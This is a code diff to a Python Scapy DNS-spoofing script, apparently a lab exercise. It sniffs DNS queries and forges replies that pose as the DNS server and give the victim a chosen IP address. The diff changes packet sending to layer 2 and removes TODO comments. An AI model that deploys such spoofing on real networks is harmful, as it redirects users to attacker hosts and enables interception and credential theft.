@@ -1,4 +1,4 @@
-from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf
+from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf, sendp, Ether
 import sys, getopt
 
 def usage():
@@ -97,7 +97,6 @@ def create_and_send(pkt, ipaddr):
     3. Send it back to the victim.
     """
     ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src) # we want the fake packet to go back to the victim, but look like it came from the DNS server
-    udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
     udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
     dns_layer = DNS(
         id=pkt[DNS].id,
@@ -107,8 +106,7 @@ def create_and_send(pkt, ipaddr):
         an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=ipaddr)
     )
     spoofed_pkt = ip_layer / udp_layer / dns_layer
-    send(spoofed_pkt, verbose=0, iface=current_iface)
-
+    sendp(Ether()/spoofed_pkt, verbose=0, iface=current_iface)
 
 def sniff_pkts(iface, bpf):
     """
@@ -127,9 +125,7 @@ def sniff_pkts(iface, bpf):
 
 iface, file, bpf = get_arguments()
 
-# TODO: Load hostnames file if provided
 if file:
     file_to_dict(file)
 
-# TODO: Start sniffing and spoofing
 sniff_pkts(iface, bpf)
